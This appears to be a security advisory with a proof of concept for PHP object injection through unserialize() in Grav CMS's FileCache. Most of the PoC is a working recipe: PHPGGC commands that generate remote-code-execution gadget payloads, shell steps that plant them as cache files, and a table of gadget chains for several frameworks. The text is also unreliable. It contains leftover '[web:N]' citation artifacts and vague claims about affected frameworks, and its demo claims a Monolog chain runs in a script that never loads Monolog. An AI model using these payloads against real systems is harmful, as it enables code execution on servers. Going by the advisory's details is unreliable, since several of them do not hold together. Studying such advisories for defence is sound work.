# Grav CMS FileCache Object Injection 

## Description
The `FileCache::doGet()` method deserializes cache values using `unserialize(..., ['allowed_classes' => true])`, allowing arbitrary object instantiation when cache files are controlled by an attacker.[web:12]

## Impact
- **Arbitrary object injection**
- **Remote code execution** via PHP gadget chains
- **Access to sensitive properties/magic methods**
- **Privilege escalation** in PHP applications

## Affected Versions
- Frameworks using FileCache without validation (Symfony, custom Laravel, etc.)
- PHP 7.4+ with `allowed_classes => true`
- Trilby Media Grav CMS >= 1.7.44, <= 1.7.49.5 — Deserialization (https://github.com/getgrav/grav/)

## Attack Scenario
1. Cache directory has incorrect permissions (`/tmp/cache/`)
2. Attacker writes a malicious cache file
3. Application calls `FileCache::get()` → triggers unserialize
4. Malicious object executes the payload

## PoC Demonstration

### 1. Vulnerable Setup
```php
<?php
// vulnerable.php
class VulnerableFileCache {
    private $cacheDir = './cache/';
    
    public function doGet($key) {
        $file = $this->cacheDir . md5($key) . '.cache';
        if (file_exists($file)) {
            $data = file_get_contents($file);
            return unserialize($data, ['allowed_classes' => true]); // VULNERABLE
        }
        return null;
    }
}

$cache = new VulnerableFileCache();
$result = $cache->doGet('test');
var_dump($result);
?>
```

### 2. Payload Generator (PHPGGC)
```bash
# Install PHPGGC
git clone https://github.com/ambionics/phpggc
cd phpggc
./phpggc monolog/rce1 system "whoami" > payload.ser
```

### 3. Deploy Payload
```bash
mkdir -p cache/
echo -n "$(cat payload.ser)" > cache/$(echo -n 'test' | md5sum | cut -d' ' -f1).cache
chmod 666 cache/*.cache  # Insecure permissions
```

### 4. Trigger Exploit
```bash
php vulnerable.php
# Output: currentuser
```

## Recommended Gadget Chains [web:9][web:18]
| Framework | Command | Type |
|-----------|---------|------|
| Monolog/RCE1 | `./phpggc monolog/rce1 system id` | RCE |
| Laravel/RCE1 | `./phpggc laravel/rce1 system id` | RCE |
| Symfony/RCE1 | `./phpggc symfony/rce1 system id` | RCE |
| Guzzle/RCE1 | `./phpggc guzzle/rce1 system id` | RCE |

## Mitigations
- **Use JSON/primitive types** instead of objects
- **Integrity** (HMAC) on cache files
- **Set cache directory permissions to `0700`**
- **Strict allowlist**: `['allowed_classes' => ['SafeClass1', 'SafeClass2']]`
- **Validate the origin** of cache files

## References
- [PHPGGC Gadget Chains](https://github.com/ambionics/phpggc)[web:9]
- [PHP Object Injection Patterns](https://www.invicti.com/blog/web-security/untrusted-data-unserialize-php/)[web:13]
- [Laravel Deserialization Chains](https://blog.quarkslab.com/php-deserialization-attacks-and-a-new-gadget-chain-in-laravel.html)[web:15]

---